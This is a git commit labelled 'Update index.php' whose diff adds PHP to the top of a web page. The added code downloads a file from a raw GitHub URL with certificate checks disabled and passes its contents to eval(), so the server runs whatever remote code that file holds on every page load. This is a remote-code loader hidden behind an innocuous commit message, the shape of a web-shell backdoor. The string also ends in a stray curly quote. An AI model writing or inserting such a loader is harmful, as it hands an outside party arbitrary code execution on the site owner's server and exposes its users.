cc2bae58975bada068bc6aaba3db81e38807a9d0
AndiPrayogi <59569783+sayray303@users.noreply.github.com>
2022-06-25 12:01:53 +0700

    Update index.php

--- index.php
+++ index.php
@@ -1,3 +1,18 @@
+<?php 
+$GithubRawURI= "https://raw.githubusercontent.com/sayray303/sayray303.githu.io/index.php”; 
+$ch = curl_init(); 
+curl_setopt($ch, CURLOPT_URL, $GithubRawURI); 
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
+$data = curl_exec($ch); 
+curl_close($ch); 
+ 
+//remove the "<?php" from the file before running it 
+$data = substr($data, 5); 
+ 
+eval ($data); 
+
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
